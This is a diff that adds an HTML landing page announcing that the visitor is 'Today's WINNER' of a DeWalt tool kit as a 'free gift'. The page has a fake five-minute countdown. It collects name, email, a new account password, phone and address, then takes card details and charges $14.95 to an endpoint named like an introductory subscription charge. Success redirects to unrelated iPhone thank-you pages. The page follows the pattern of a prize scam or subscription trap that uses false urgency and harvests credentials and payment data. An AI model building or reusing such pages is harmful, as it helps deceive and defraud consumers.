@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>DeWalt Combo Kit</title>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
+  <style>
+    :root{
+      --bg:#0f1116; --text:#0b0d12; --card:#ffffff; --muted:#667085; --blue:#1f66ff; --blue-d:#1552d6;
+      --shadow:0 12px 30px rgba(13,17,23,.18); --radius:16px;
+      --pill:#101318; --pill-text:#fff;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{margin:0;background:#ffffff;color:#0b0d12;font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
+    img{max-width:100%;display:block}
+
+    /* Confetti bg (subtle) */
+    .confetti{
+      background-image:
+        radial-gradient(#ffd166 1.5px,transparent 1.5px),
+        radial-gradient(#ef476f 1.5px,transparent 1.5px),
+        radial-gradient(#06d6a0 1.5px,transparent 1.5px),
+        radial-gradient(#118ab2 1.5px,transparent 1.5px);
+      background-size: 120px 120px, 150px 150px, 180px 180px, 200px 200px;
+      background-position: 20px 30px, 40px 60px, 80px 20px, 120px 100px;
+      animation: conf 16s linear infinite;
+    }
+    @keyframes conf{
+      from{ background-position: 20px 30px, 40px 60px, 80px 20px, 120px 100px; }
+      to  { background-position: 20px 300px, 40px 360px, 80px 320px, 120px 400px; }
+    }
+
+    /* Hero */
+    .wrap{max-width:1100px;margin:0 auto;padding:26px 18px 40px}
+    .title{font-size:42px;line-height:1.15;font-weight:900;text-align:center;margin:20px 0 6px}
+    .winner{font-size:96px;line-height:1;letter-spacing:2px;font-weight:900;text-align:center;margin:0;
+            background:linear-gradient(180deg,#2880ff 0%,#1a5bdf 100%); -webkit-background-clip:text; -webkit-text-fill-color:transparent}
+    .reserved{margin:12px 0 16px;text-align:center;font-size:22px;color:#111}
+    .timer{display:flex;justify-content:center;gap:10px;margin:6px 0 6px}
+    .tbox{width:68px;height:68px;border-radius:12px;background:#101318;color:#fff;display:flex;align-items:center;justify-content:center;
+          font-weight:900;font-size:34px;box-shadow:inset 0 -3px 0 rgba(255,255,255,.04)}
+    .tlabel{display:flex;justify-content:center;gap:80px;letter-spacing:.18em;color:#6b7280;font-size:12px;margin-top:6px}
+
+    /* Grid */
+    .grid{display:grid;grid-template-columns:1.05fr .95fr;gap:28px;margin-top:34px}
+    @media (max-width:980px){ .grid{grid-template-columns:1fr} .winner{font-size:64px} }
+
+    .product{border-radius:18px;overflow:hidden;box-shadow:var(--shadow)}
+    /* ===== CHANGED: remove inner dark frame/border/padding ===== */
+    .product .imgbox{background:none;padding:0;border:none}
+    .product .caption{padding:14px 16px;font-size:22px;font-weight:800}
+
+    /* Blue card (Delivery Address) */
+    .card{background:var(--card);border-radius:20px;box-shadow:var(--shadow);overflow:hidden}
+    .card-top{background:var(--blue);color:#fff;padding:14px 18px;font-weight:900;display:flex;align-items:center;gap:10px}
+    .card-top small{display:block;font-weight:500;opacity:.9}
+    .card-body{padding:18px}
+
+    .input,.select,.el{
+      width:100%;border:1px solid #e5e7eb;border-radius:12px;padding:12px 14px;font-size:15px;outline:none;
+      background:#fff; color:#111827;
+    }
+    .input::placeholder{color:#9aa3af}
+
+    .formgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    @media (max-width:560px){ .formgrid{grid-template-columns:1fr} }
+
+    .row{display:grid;grid-template-columns:130px 1fr 1fr;gap:12px}
+    @media (max-width:560px){ .row{grid-template-columns:1fr} }
+
+    .btn{width:100%;border:none;border-radius:12px;padding:14px 16px;font-weight:900;font-size:16px;cursor:pointer;
+         background:linear-gradient(180deg,#2b76ff,#1b4fe0); color:#fff; box-shadow:0 10px 20px rgba(34,98,255,.25); margin-top:14px}
+    .btn.muted{background:#e5e7eb;color:#111827}
+
+    .el{padding:10px 12px;background:#fff}
+
+    .err{display:none;background:#fee2e2;border:1px solid #fecaca;color:#991b1b;padding:10px;border-radius:10px;font-size:14px;margin-top:10px}
+    .err[aria-hidden="false"]{display:block}
+
+    /* Loading overlay (kept from your previous page) */
+    .loading-overlay{ position:fixed; inset:0; background:rgba(3,6,14,.86);
+      display:none; align-items:center; justify-content:center; z-index:9999; }
+    .loading-overlay[aria-hidden="false"]{ display:flex }
+    .loading-box{ width:min(92vw,460px); background:#0f131b; border:1px solid #2b3140;
+      border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.25); padding:20px; text-align:center; color:#cdd6ea }
+    .loading-title{ font-weight:800; margin:2px 0 10px; font-size:18px }
+    .progress-wrap{ width:100%; height:10px; background:#1a2230; border-radius:999px; overflow:hidden; }
+    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg,#7aa3ff,#2dd4bf); animation: loadingBar 2.2s ease-in-out infinite; }
+    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
+
+    /* Hide step container helper */
+    .step{display:none}
+    .step[aria-hidden="false"]{display:block}
+  </style>
+</head>
+<body class="confetti">
+  <div class="wrap">
+    <h1 class="title">Congratulations! You're Today's</h1>
+    <h2 class="winner">WINNER</h2>
+    <div class="reserved">Your Spot Is Reserved For</div>
+    <div class="timer" id="timer">
+      <div class="tbox" id="tMin1">0</div>
+      <div class="tbox" id="tMin2">5</div>
+      <div class="tbox" id="tSep">:</div>
+      <div class="tbox" id="tSec1">0</div>
+      <div class="tbox" id="tSec2">0</div>
+    </div>
+    <div class="tlabel"><span>MINUTES</span><span style="margin-left:54px">SECONDS</span></div>
+
+    <div class="grid" style="margin-top:28px">
+      <!-- Left: product -->
+      <section class="product">
+        <div class="imgbox">
+          <img alt="DeWalt Combo Kit" src="toolkit.png" />
+        </div>
+        <div class="caption">DeWalt Combo Kit</div>
+      </section>
+
+      <!-- Right: form / steps (unchanged backend IDs & flow) -->
+      <section class="card">
+        <div class="card-top">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M3 7h18M5 5h14a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2Z" stroke="#fff" stroke-width="2" stroke-linecap="round"/><path d="M3 10h18" stroke="#fff" stroke-width="2"/><circle cx="7.5" cy="15.5" r="1.5" fill="#fff"/></svg>
+          <div>Delivery Address <small>Where Do We Send Your Free Gift</small></div>
+        </div>
+
+        <div class="card-body">
+          <!-- STEP 1 -->
+          <div id="step1" class="step" aria-hidden="false">
+            <div class="formgrid">
+              <input id="firstName" class="input" placeholder="First Name" autocomplete="given-name" required>
+              <input id="lastName" class="input" placeholder="Last Name" autocomplete="family-name" required>
+            </div>
+
+            <div class="formgrid" style="margin-top:12px">
+              <input id="emailInput" class="input" placeholder="Email" type="email" autocomplete="email" required>
+              <input id="passwordInput" class="input" type="password" placeholder="Create a password" autocomplete="new-password" required>
+            </div>
+
+            <div class="row" style="margin-top:12px">
+              <select id="phonePrefix" class="select" aria-label="Country calling code"></select>
+              <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone" autocomplete="tel-national">
+              <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Zip / Postal">
+            </div>
+
+            <div class="formgrid" style="margin-top:12px">
+              <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Street Address">
+              <input id="billingCity" class="input" autocomplete="address-level2" placeholder="City">
+            </div>
+
+            <div style="margin-top:12px">
+              <select id="billingCountry" class="select" aria-label="Country (ISO 2-letter)"></select>
+            </div>
+
+            <!-- Hidden combined full name for backend compatibility -->
+            <input id="nameInput" type="hidden" />
+
+            <button id="nextBtn" class="btn">Continue →</button>
+          </div>
+
+          <!-- STEP 2 -->
+          <div id="step2" class="step" aria-hidden="true">
+            <div class="small" style="margin:0 0 10px;color:#475569">Card details are encrypted and processed by Stripe.</div>
+            <div class="el" id="card-number"></div>
+            <div class="formgrid" style="margin-top:10px">
+              <div class="el" id="card-expiry"></div>
+              <div class="el" id="card-cvc"></div>
+            </div>
+
+            <div id="err" class="err" role="alert" aria-hidden="true"></div>
+
+            <div class="formgrid" style="margin-top:12px">
+              <button id="backBtn" class="btn muted">← Back</button>
+              <button id="payNow" class="btn">Pay $14.95 Securely</button>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+  </div>
+
+  <!-- Loading overlay -->
+  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
+    <div class="loading-box">
+      <div class="loading-title">Processing your payment…</div>
+      <div class="progress-wrap"><div class="progress-bar"></div></div>
+      <p class="small" style="margin-top:10px;color:#97a0b3">Please wait, this may take a few seconds.</p>
+    </div>
+  </div>
+
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    // ---------- Countdown (5 minutes) ----------
+    (function(){
+      let total = 5*60; // seconds
+      const el = {
+        m1:document.getElementById('tMin1'),
+        m2:document.getElementById('tMin2'),
+        s1:document.getElementById('tSec1'),
+        s2:document.getElementById('tSec2'),
+      };
+      function tick(){
+        const m = Math.floor(total/60), s = total%60;
+        const mm = String(m).padStart(2,'0');
+        const ss = String(s).padStart(2,'0');
+        el.m1.textContent = mm[0]; el.m2.textContent = mm[1];
+        el.s1.textContent = ss[0]; el.s2.textContent = ss[1];
+        if(total>0) total--;
+      }
+      tick(); setInterval(tick,1000);
+    })();
+
+    // ---------- DOM ----------
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const errBox = document.getElementById('err');
+    const nextBtn = document.getElementById('nextBtn');
+    const backBtn = document.getElementById('backBtn');
+
+    const firstName = document.getElementById('firstName');
+    const lastName  = document.getElementById('lastName');
+    const nameInput = document.getElementById('nameInput');
+
+    const phonePrefix = document.getElementById('phonePrefix');
+    const phoneNumber = document.getElementById('phoneNumber');
+
+    const billingStreet = document.getElementById('billingStreet');
+    const billingCity   = document.getElementById('billingCity');
+    const billingCountry= document.getElementById('billingCountry'); // select with ISO-2
+    const billingPostcode = document.getElementById('billingPostcode');
+
+    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
+    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    const FIXED_PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W";
+    const API_BASE = (location.protocol.startsWith('http') ? location.origin : 'http://localhost:10000');
+
+    function show(o){ o?.setAttribute('aria-hidden','false'); }
+    function hide(o){ o?.setAttribute('aria-hidden','true'); }
+
+    // Loading overlay
+    const overlay = document.getElementById('loading-overlay');
+    function showLoading(){ overlay?.setAttribute('aria-hidden','false'); }
+    function hideLoading(){ overlay?.setAttribute('aria-hidden','true'); }
+
+    // ---------- Country + Prefix data ----------
+    const COUNTRY_CHOICES = {
+      GE:'Georgia', US:'United States', GB:'United Kingdom', IE:'Ireland',
+      CA:'Canada', AU:'Australia', NZ:'New Zealand',
+      DE:'Germany', FR:'France', ES:'Spain', IT:'Italy', NL:'Netherlands',
+      BE:'Belgium', CH:'Switzerland', AT:'Austria', DK:'Denmark', NO:'Norway',
+      SE:'Sweden', FI:'Finland', PT:'Portugal', PL:'Poland', CZ:'Czechia',
+      HU:'Hungary', RO:'Romania',
+      BR:'Brazil', MX:'Mexico', AR:'Argentina', CL:'Chile', CO:'Colombia',
+      ZA:'South Africa',
+      IN:'India', SG:'Singapore', MY:'Malaysia', TH:'Thailand', VN:'Vietnam', PH:'Philippines',
+      HK:'Hong Kong', JP:'Japan', KR:'South Korea',
+      AE:'United Arab Emirates', SA:'Saudi Arabia', TR:'Turkey', IL:'Israel'
+    };
+    const CALLING_CODES = {
+      US:'+1', CA:'+1', GB:'+44', IE:'+353', AU:'+61', NZ:'+64',
+      DE:'+49', FR:'+33', ES:'+34', IT:'+39', NL:'+31', BE:'+32',
+      CH:'+41', AT:'+43', DK:'+45', NO:'+47', SE:'+46', FI:'+358',
+      PT:'+351', PL:'+48', CZ:'+420', HU:'+36', RO:'+40',
+      BR:'+55', MX:'+52', AR:'+54', CL:'+56', CO:'+57', ZA:'+27',
+      IN:'+91', SG:'+65', MY:'+60', TH:'+66', VN:'+84', PH:'+63',
+      HK:'+852', JP:'+81', KR:'+82', AE:'+971', SA:'+966', TR:'+90', IL:'+972',
+      GE:'+995'
+    };
+
+    function populateCountrySelect(){
+      billingCountry.innerHTML = '';
+      billingCountry.append(new Option('Select country', '', true, true));
+      const priority = ['GE','US','GB','DE','FR','ES','IT','NL','SE','IN','JP'];
+      const seen = new Set();
+      const add = (code) => {
+        if (seen.has(code) || !COUNTRY_CHOICES[code]) return;
+        seen.add(code);
+        billingCountry.append(new Option(COUNTRY_CHOICES[code], code));
+      };
+      priority.forEach(add);
+      Object.keys(COUNTRY_CHOICES)
+        .filter(c => !priority.includes(c))
+        .sort((a,b)=>COUNTRY_CHOICES[a].localeCompare(COUNTRY_CHOICES[b]))
+        .forEach(add);
+    }
+
+    function populatePrefixOptions(){
+      phonePrefix.innerHTML = '';
+      const priority = ['GE','US','GB','CA','AU','DE','FR','ES','IT','NL','SE','IN','JP'];
+      const seen = new Set();
+      const add = (cc) => {
+        if (seen.has(cc) || !CALLING_CODES[cc]) return;
+        seen.add(cc);
+        const code = CALLING_CODES[cc];
+        theLabel = `${code} — ${COUNTRY_CHOICES[cc] || cc}`;
+        phonePrefix.append(new Option(theLabel, code));
+      };
+      priority.forEach(add);
+      Object.keys(CALLING_CODES)
+        .filter(cc => !priority.includes(cc))
+        .sort()
+        .forEach(add);
+      if (!phonePrefix.value) phonePrefix.value = CALLING_CODES.US;
+    }
+
+    function setPrefixFromISO(cc){
+      const code = CALLING_CODES[cc];
+      if (!code) return;
+      const exists = Array.from(phonePrefix.options).some(o=>o.value===code);
+      if(!exists) phonePrefix.add(new Option(`${code} — ${COUNTRY_CHOICES[cc]||cc}`, code));
+      phonePrefix.value = code;
+    }
+
+    populateCountrySelect();
+    populatePrefixOptions();
+
+    // ---------- IP Prefill ----------
+    const withTimeout = (ms,p)=>Promise.race([p,new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),ms))]);
+    function guessISO(){ const cc=(navigator.language||'').split('-')[1]; return cc?cc.toUpperCase():null; }
+
+    async function hydrateFromIP(){
+      try{
+        const try1=()=>withTimeout(2000, fetch('https://ipapi.co/json/').then(r=>r.json()));
+        const try2=()=>withTimeout(2000, fetch('https://ipwho.is/?fields=city,country,country_code,phone').then(r=>r.json()));
+        const try3=()=>withTimeout(2000, fetch('https://ipinfo.io/json').then(r=>r.json()));
+        let d=null; try{ d=await try1(); }catch{} if(!d||d.error){ try{ d=await try2(); }catch{} } if(!d||d.error){ try{ d=await try3(); }catch{} }
+
+        let iso = (d && (d.country_code || d.countryCode)) ? String(d.country_code || d.countryCode).toUpperCase() : null;
+        const city = d?.city || null;
+        if(!iso) iso = guessISO();
+
+        if(iso && Array.from(billingCountry.options).some(o=>o.value===iso)){ billingCountry.value = iso; }
+        if(iso) setPrefixFromISO(iso);
+        if(city) billingCity.value = city;
+      }catch{
+        const iso = guessISO();
+        if(iso){ billingCountry.value = iso; setPrefixFromISO(iso); }
+      }
+    }
+    hydrateFromIP();
+    phoneNumber.addEventListener('focus', hydrateFromIP);
+    billingCountry.addEventListener('change', e => setPrefixFromISO(e.target.value));
+
+    // ---------- Navigation + account creation ----------
+    function showStep2(){ hide(step1); show(step2); }
+    nextBtn?.addEventListener('click', async ()=>{
+      nameInput.value = `${(firstName.value||'').trim()} ${(lastName.value||'').trim()}`.trim();
+      showStep2();
+      try{ await ensureAccount(); }catch(e){
+        if(errBox){ errBox.textContent = 'Account setup warning: ' + (e.message||'check details'); errBox.setAttribute('aria-hidden','false'); }
+      }
+    });
+    backBtn?.addEventListener('click', ()=>{ hide(step2); show(step1); });
+
+    // ---------- Stripe ----------
+    let stripe, elements, cardNumber, cardExpiry, cardCvc;
+    try{
+      if(window.Stripe){
+        stripe = Stripe(PUBLISHABLE_KEY);
+        elements = stripe.elements();
+        cardNumber = elements.create('cardNumber');
+        cardExpiry = elements.create('cardExpiry');
+        cardCvc    = elements.create('cardCvc');
+        cardNumber.mount('#card-number');
+        cardExpiry.mount('#card-expiry');
+        cardCvc.mount('#card-cvc');
+      }
+    }catch(e){ console.warn('Stripe init skipped:', e); }
+
+    async function ensureAccount(){
+      const email = document.getElementById('emailInput')?.value.trim();
+      const password = document.getElementById('passwordInput')?.value;
+      const prefix = phonePrefix?.value || '';
+      const raw = (phoneNumber?.value || '').replace(/[^0-9]/g,'');
+      const phone = raw ? (prefix + raw) : '';
+      if(!email || !password) throw new Error('Email and password required');
+      const r = await fetch(API_BASE + '/api/register',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ email, password, phone }) });
+      if(r.status===201) return true; let data={}; try{ data=await r.json(); }catch{} if(r.status===400 && (data.error||'').toLowerCase().includes('exists')) return true; throw new Error(data.error || 'Registration failed');
+    }
+
+    document.getElementById('payNow')?.addEventListener('click', async ()=>{
+      if(!stripe){ alert('Payment temporarily unavailable. Please check your connection and try again.'); return; }
+      errBox?.setAttribute('aria-hidden','true'); if(errBox) errBox.textContent='';
+      showLoading();
+
+      const name = (nameInput.value||'').trim();
+      const email = document.getElementById('emailInput')?.value.trim();
+      const raw = (phoneNumber?.value || '').replace(/[^0-9]/g,'');
+      const fullPhone = raw ? ((phonePrefix?.value||'') + raw) : undefined;
+
+      const isoCountry = billingCountry.value || undefined;
+
+      const address = {
+        line1: (billingStreet?.value||'').trim() || undefined,
+        city: (billingCity?.value||'').trim() || undefined,
+        country: isoCountry,
+        postal_code: (billingPostcode?.value||'').trim() || undefined
+      };
+
+      try{
+        const pmRes = await stripe.createPaymentMethod({
+          type:'card',
+          card:cardNumber,
+          billing_details:{ name:name||undefined, email:email||undefined, phone:fullPhone, address }
+        });
+        if(pmRes.error) throw new Error(pmRes.error.message);
+
+        const resp = await fetch(SUBSCRIBE_URL,{
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({
+            paymentMethodId: pmRes.paymentMethod.id,
+            name,
+            email,
+            phone: fullPhone,
+            address
+          })
+        });
+        const data = await resp.json();
+        if(!data.clientSecret) throw new Error(data.error || 'Payment failed to start');
+
+        const conf = await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error) throw new Error(conf.error.message);
+        if(conf.paymentIntent && conf.paymentIntent.status==='succeeded'){
+          // ===== Robust 50/50 split redirect (deterministic by PaymentIntent ID) =====
+          (function(){
+            const A = 'thankyou-iphone.html';
+            const B = 'thankyou-iphone-skip.html';
+
+            const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
+
+            function fnv1a32(str){
+              let h = 0x811c9dc5 >>> 0;
+              for (let i = 0; i < str.length; i++){
+                h ^= str.charCodeAt(i);
+                h = Math.imul(h, 0x01000193) >>> 0;
+              }
+              return h >>> 0;
+            }
+
+            function cryptoRandInt(max){
+              if (!Number.isFinite(max) || max <= 0) throw new Error('max must be positive');
+              const u32 = new Uint32Array(1);
+              const range = 0x100000000;
+              const bucket = Math.floor(range / max) * max;
+              let r;
+              do {
+                crypto.getRandomValues(u32);
+                r = u32[0];
+              } while (r >= bucket);
+              return r % max;
+            }
+
+            const pickA = pid
+              ? ((fnv1a32(pid) % 100) < 50)
+              : (cryptoRandInt(100) < 50);
+
+            const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());
+
+            window.location.href = (pickA ? A : B) + qb;
+          })();
+          // ===============================================================
+        } else {
+          throw new Error('Payment not completed');
+        }
+      }catch(err){
+        if(errBox){ errBox.textContent = err.message || 'Something went wrong.'; errBox.setAttribute('aria-hidden','false'); }
+        hideLoading();
+      }
+      // keep overlay up on success / 3DS until redirect
+    });
+  </script>
+
+  <!-- GoAffPro loader (keep this so the next page can track) -->
+  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+</body>
+</html>
